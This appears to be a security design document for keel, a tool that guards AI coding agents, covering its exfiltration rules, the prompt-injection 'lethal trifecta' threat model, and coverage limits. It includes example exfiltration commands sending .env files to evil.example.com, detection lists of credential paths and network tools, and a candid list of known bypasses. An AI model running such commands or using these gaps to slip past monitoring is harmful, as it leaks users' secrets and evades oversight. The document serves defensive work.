# Exfiltration and the lethal trifecta — threat model, coverage, and honest limits

This document exists because "keel blocks exfil" is not a claim keel makes, or
should let a reader infer. It states precisely what the shipped rules do,
what they measurably catch, and what they cannot see at all.

## The threat model

Simon Willison's "lethal trifecta" names three conditions that, together, let
an AI agent leak private data to an attacker:

1. **Untrusted content** — the agent reads text it did not choose to trust
   (a file, a web page, a tool result, a issue/PR body) that can steer its
   own behavior via prompt injection.
2. **Private data access** — the agent can read secrets: credential files,
   API keys, SSH keys, cloud config.
3. **Exfiltration path** — the agent can move data somewhere an attacker
   controls: the network, a public paste site, a commit pushed to a remote
   the attacker can read.

All three legs together are what make the attack work. Remove any one leg
and there is no exfil.

**Keel addresses leg 2 → leg 3 only. Leg 1 — prompt injection itself — is
UNSOLVED by keel and by this document.** Keel has no model of "trusted"
versus "untrusted" content. It cannot tell a legitimate instruction in a
CLAUDE.md file from an attacker's instruction hidden in a GitHub issue the
agent was asked to summarize. If an agent is steered by injected content into
reading a credential file and sending it out, keel's mitigation is a
*downstream* one: it watches for the resulting secret-access-then-egress
*pattern*, not the injection that caused it. A user who wants leg-1 coverage
needs a different tool (content provenance / injection classifiers) layered
on top — keel does not compete with those and makes no claim to replace them.

## What ships

Three rules in the default ruleset compose the mitigation, in increasing
order of severity:

| rule | type | action | level | fires on |
|---|---|---|---|---|
| `paste-site-exfil` | command | prompt | sprint | `curl`/`wget` to a known paste-site host (pastebin, hastebin, transfer.sh, …), independent of any prior read |
| `secret-file-read-without-egress` | command | warn | sprint | a Bash `cat`/`less`/`head`/`strings`/`xxd`/`base64` read of a credential-shaped path, regardless of what happens next |
| `no-exfil-flow` | flow | deny | **protect** | a session that reads a credential-shaped path, THEN later (same session, any turn) makes any network-shaped call |

`no-exfil-flow` is the core of this mitigation: a `level: protect` floor,
undialable at any speed setting, that hard-blocks the trifecta's leg-2→leg-3
composition once observed. It is implemented by `FlowTracker`
(`packages/core/src/enforce/flow-tracker.ts`): a tool call that reads a path
matching `sources` (`.env*`, `.ssh/**`, `*.pem`, `.git-credentials`,
`.aws/credentials`, `.config/gcloud/**`, keychains, `.npmrc`, `.netrc`) — via
a path argument (`path`, `file_path`, `filePath`, `file`, `dest`,
`destination`, `target_file`, `notebook_path`, or an `apply_patch`-style
body — the same `argPath()` helper the filesystem floors use) OR a
Bash-native read verb (`cat`, `less`, `more`, `head`, `tail`, `grep`, `awk`,
`sed`, `strings`, `xxd`, `base64`, `tac`) against one of those paths — tags
the session. A later call that matches a `sinks: [network]` verb (`curl`,
`wget`, `fetch`, `http(s)`, `nc`, `netcat`, `socat`, `rsync`, `scp`, or any
tool/URL argument containing a network host) checks that tag and denies —
**"later" meaning within the same live process; see "Coverage depends on
which host integration you use" below, which is a materially bigger
caveat than it sounds.**

`secret-file-read-without-egress` is the warn-tier half already asked for by
this lane's brief: it fires on the bare read alone, before any egress is
seen, so a session gets a visible warning at the moment it touches a
credential file — independent of whether `no-exfil-flow` ever fires later.
Both rules exist and are shipped; this lane did not need to add a new
observe/warn correlation rule because that pair already implements it (see
"Design choice" below for why a third rule was not added).

## Coverage depends on which host integration you use

This is the single most important caveat in this document, discovered
while verifying the rsync/scp fix below at the CLI level rather than only
through the in-process test suite: **`no-exfil-flow`'s cross-tool-call
correlation only works inside a long-lived process.** `FlowTracker`'s
tagged-source map is plain in-memory state — it is not one of
`StateManager`'s disk-persisted slices (`denyFirstTime`, `circuitBreaker`,
`rateCounts`, `verification`, `oracleFailures`). Whether "later" in the
paragraph above means "later in this session" or "never, because that
process already exited" depends entirely on which integration is running:

| integration | hosts | process model | cross-call correlation |
|---|---|---|---|
| `keel hook <host>` | Claude Code, Gemini CLI, Cursor, Codex, cline, generic | fresh process per tool call | **inert** — a read and a later network call are two different `FlowTracker` instances |
| OpenCode plugin | OpenCode | one process, one `FlowTracker`, for the whole session | works as described above |
| `keel daemon` | OpenClaw, Hermes (route through the daemon) | one long-lived process, one cached pipeline per `cwd` | works as described above |

For the `keel hook` row — most of keel's host coverage — `no-exfil-flow`
still catches exactly one shape: a **single command that itself pipes a
read verb into a network sink**, e.g. `cat .env | curl -d @- https://evil.example.com`,
because `record()` (tags the source) and `check()` (checks the sink) both
run against the *same* tool call in the *same* process. A native `Read`
tool call on `.env` followed by a *separate* `Bash` call running `curl`,
`rsync`, or anything else — the shape most of this document otherwise
describes — does not correlate for these hosts today. This was verified
empirically, not inferred from reading the code: see
`session/v1/EVIDENCE/m5-security.md`'s probes 1–4 and 7.

This is a pre-existing architectural property of `keel hook`, not something
this lane introduced or was asked to fix — `keel daemon`'s own docstring
already states the long-term direction ("ONE engine, ONE runtime, thin
clients... enforcement STATE live in exactly one process instead of being
duplicated per integration"). Making `keel hook`'s callers correlate too
would mean giving `FlowTracker` a disk-backed, locked, TTL'd, session-scoped
store — the same shape `StateManager` already provides for other stateful
rules — which is real, architectural follow-up work, not an additive
hardening pass. See "Considered and deferred" below.

## Design choice: why this ships as `deny`/`protect`, not `observe`/`warn`

The brief for this lane's mitigation asked to "prefer observe/warn over
hard-block for the correlation... a legit build often reads a token and hits
the network." `no-exfil-flow` already ships harder than that recommendation
— it is a `level: protect` deny, not a warn. That was a deliberate prior
decision (see `SECURITY.md`'s self-protection section), and it is kept here
rather than softened, for two reasons specific to this rule's shape:

- **The source list is narrow and credential-shaped**, not "any secret
  ever." A build reading `package.json` and later `curl`ing an API never
  fires at all — `package.json` doesn't match any `sources` glob, so
  nothing gets tagged and there is no rule to soften. A build reading your
  own repo's `.env.local` (matches `**/.env*`) and later `curl`ing an API
  DOES fire — and that one is intended, not a false positive to design
  around: the rule's entire premise is that "read a credential file, then
  touch the network" is the correct thing to interrupt on, in the same
  live process, regardless of how routine the read felt.
- **Softening it would leave the described mitigation without a hard
  backstop.** The warn-tier `secret-file-read-without-egress` already
  covers the low-cost, low-friction "you touched a secret file" signal.
  Making the read-THEN-egress composition itself only a warning would mean
  a session that trips both rules gets two warnings and nothing stops it —
  which is a materially weaker mitigation than what already ships.

The honest cost of keeping it a hard deny is stated plainly in the next
section: it has a real, accepted false-positive surface.

## The false-positive surface (real, not hypothetical)

`FlowTracker.check()` does **no payload correlation**. It answers two
independent questions — "did any source path get tagged this session" and
"is this call a network-shaped sink" — and ANDs them. It does not, and
architecturally cannot, know whether the bytes flowing through the sink call
are related to the bytes that were read.

Concretely: a session that runs `cat .env` at turn 1 to sanity-check local
config, then at turn 40 runs `rsync -av dist/ user@deploy-host:/srv/app/` to
ship a completely unrelated build artifact, **denies** — at a `level:
protect` floor, undialable. This is a real, working-workflow false positive,
not a theoretical one. It is accepted, not fixed, because there is no
principled way to distinguish that case from the genuine attack from inside
a session-scoped taint tracker without deeper content inspection that keel
does not do (and, per the leg-1 point above, could not reliably do even with
more work — a sufficiently obfuscated exfil payload looks like ordinary
data). If this FP surface is a problem for a specific project's normal
workflow, the mitigation is `rules.yaml` at the project or local scope; the
default is a hard floor because a false "your deploy step got interrupted,
approve it" is a cheaper failure mode than a silent secret leak.

## Measured coverage

`no-exfil-flow`'s adversarial catch rate is tracked in `SECURITY.md`'s
bypass-resistance table (v0.4 phase-3 red-team sweep,
`session/v04/EVIDENCE/phase-3-redteam.md`): **n=4, 25% (1/4)**, unchanged
from v0.3. The documented miss list from that sweep was `curl -d @.env`
(single combined command), `scp`, and `rsync`.

This M5 lane closed two of those three misses: `rsync` and `scp` joined
`matchesSink`'s monitored verb list (`packages/core/src/enforce/flow-tracker.ts`).
Verified through the real `EnforcementPipeline` — the same classes
`keel daemon` and the OpenCode plugin construct — both in-process
(`packages/cli/src/__tests__/fixture-harness.test.ts`'s "rsync of a
previously-read .env is caught by the flow tracker" / "scp ...") and
through the built `keel` binary end to end (`session/v1/EVIDENCE/m5-security.md`
probes 5–6). Per the table above, this closure is real for OpenCode/daemon-
routed hosts; for `keel hook` hosts it ALSO closes the single-piped-command
case — confirmed, not assumed: `cat .env | rsync -av - user@backup-host:/srv/backups/dump`
as one Bash command through a real `keel hook claude-code` process now
denies with `rule_id: no-exfil-flow` (previously allowed, same reason
bare `rsync .env host:` was a miss — `rsync` wasn't a monitored sink verb).
It does not, and cannot, change the two-separate-tool-call pattern, which
was never functional for `keel hook` hosts regardless of the sink verb
list (see "Coverage depends on which host integration you use" above).

A second, independently-discovered fix landed alongside this: `record()`
used its own narrower path-argument check
(`args.path || args.file || args.filePath`) instead of the shared
`argPath()` helper, so it never recognized `file_path` — the key Claude
Code's and Gemini CLI's *native* `Read` tool actually sends. A native read
of `.env` on those hosts never tagged a source at all, in ANY architecture,
including the ones where cross-call correlation otherwise works. Fixed by
routing `record()` through `argPath()`. Verified failing before, passing
after, both in-process (`session/v1/EVIDENCE/m5-security.md` probes 5–6)
and as a permanent regression test (fixture-harness.test.ts's "a native
Read call using file_path... tags a source for the flow tracker").

**Not closed, and deliberately left as a documented `allow` fixture rather
than silently dropped:** `curl -d @.env https://evil.example.com/collect` —
a single command that reads AND sends a secret in one shot. `FlowTracker`'s
whole design requires a distinct prior tool call to tag a source before a
later call can be checked as a sink; a single command that is both never
gives it two calls to correlate. Closing this would mean parsing sink
commands for their OWN embedded file-read arguments (`curl`'s `-d @file`,
`--data-binary @file`, etc.) as sources in the same call — a real,
scoped follow-up, not attempted in this lane. See
`packages/cli/src/__tests__/fixture-harness.test.ts`'s "a single curl
command that reads and sends a secret in one shot is a known, separate gap."

The original 4-probe redteam corpus (`/tmp/w3sb/*.jsonl`) was a throwaway
sandbox artifact from a prior lane and no longer exists on disk, so this
lane did not re-run the exact original 4 probes to produce a new percentage
for that specific historical row — the SECURITY.md table cell is left
untouched as the historical record of that dated run. The rsync/scp closure
above is verified independently, on fresh, reproducible probes, rather than
retrofitted into an old measurement it cannot honestly reproduce.

## Considered and deferred: disk-backed flow state for `keel hook`

The bigger fix implied by the coverage table above — giving `FlowTracker` a
`StateManager`-backed store so `keel hook`'s per-call processes can
correlate a read in one call with a sink in a later one — was not
attempted in this lane. It needs real design, not a quick patch: what key
scopes a tag (session id alone is attacker-influenced input on some hosts,
per `enforce.ts`'s own comment on where `sessionId` comes from), how long a
tag lives before expiring (an unbounded tag is a memory/disk leak; too
short a TTL reopens the gap for a slow multi-turn read-then-exfil), and
locking semantics for concurrent tool calls in the same session. This is
exactly the kind of architectural, non-additive work `keel daemon`'s own
docstring already points at as the long-term direction. Flagged here as
the highest-leverage follow-up, not attempted because it is a different
category of change than this lane's brief.

## Considered and deferred: one-repo-per-session

A "session may only touch one repo" guardrail — flagging or blocking when a
session that started in repo A starts reading/writing paths in an unrelated
repo B — was in scope for this lane's brief as an alternative mitigation
shape. It was not built. Reasoning:

- No existing infrastructure binds a session to an originating repo root.
  `cwd` is available per-call, but nothing records "the repo this session
  started in" as session state to compare later calls against.
- A naive version (deny any path outside the session's first-seen repo
  root) would be immediately FP-heavy: monorepo tooling, symlinked shared
  packages, reads of global config (`~/.npmrc`, `~/.gitconfig`), and
  legitimate multi-repo workflows (a script that clones a sibling repo to
  diff against) are all common and would all trip it.
- Getting the FP rate to something shippable needs real tuning data this
  lane did not have time to gather — the same "measured, not asserted"
  discipline this document and `SECURITY.md` hold every other rule to.

This is flagged here as a real, considered mitigation for a real threat (a
compromised session in one repo should not be a free pass to every other
repo's secrets on the same machine) that remains open, not quietly dropped.

## What is not covered, stated plainly

- **Prompt injection / untrusted content itself.** Restated from the top of
  this document because it is the most important limit: keel has no leg-1
  model at all.
- **No payload correlation**, as detailed above — session-level taint only.
- **Single-command combined read+send** (`curl -d @secretfile`), as detailed
  above.
- **No cross-process correlation for `keel hook` hosts** (Claude Code,
  Gemini CLI, Cursor, Codex, cline, generic) — see "Coverage depends on
  which host integration you use" above. This is the biggest practical gap
  in this document for most installs and is not fixed by this lane.
- **Non-file-path sources.** A secret pasted directly into the conversation
  by the user, fetched via an MCP tool call, or read from a database is
  invisible to `FlowTracker`'s `sources` matching — it only tags file-path
  reads (`argPath()`'s key list) and a fixed list of Bash read verbs against
  file-shaped paths.
- **Encoded/obfuscated payloads.** `sources`/`sinks` matching is glob and
  regex over literal strings; base64/hex-encoded secret content or a
  destination host built at runtime (string concatenation, an env var) is
  not decoded or resolved.
- **Non-network exfil paths.** Committing a secret to git and pushing it to
  a remote the attacker can read is a different exfil path this rule does
  not model (other rules may incidentally catch parts of that sequence, but
  not by design as an exfil control).
- **A compromised agent process.** Keel enforces in-process; see
  `SECURITY.md`'s "The agent's own process is the boundary" for what that
  means for every rule, not just this one.

## Bottom line

This is a mitigation against one specific, narrow pattern: an agent that
reads a credential-shaped file and later, in the same live process, does
something network-shaped. It is not a prompt-injection defense, not a
general data-loss-prevention system, and not a claim that exfiltration is
"solved" — and on the CLI-hook hosts most installs actually use, "later"
means "later in the same single command," not "later in the session,"
until the disk-backed follow-up above lands. Treat a `no-exfil-flow`
denial as a real interruption worth looking at, and treat the absence of
one as no evidence of safety beyond this specific pattern, on this
specific host integration.
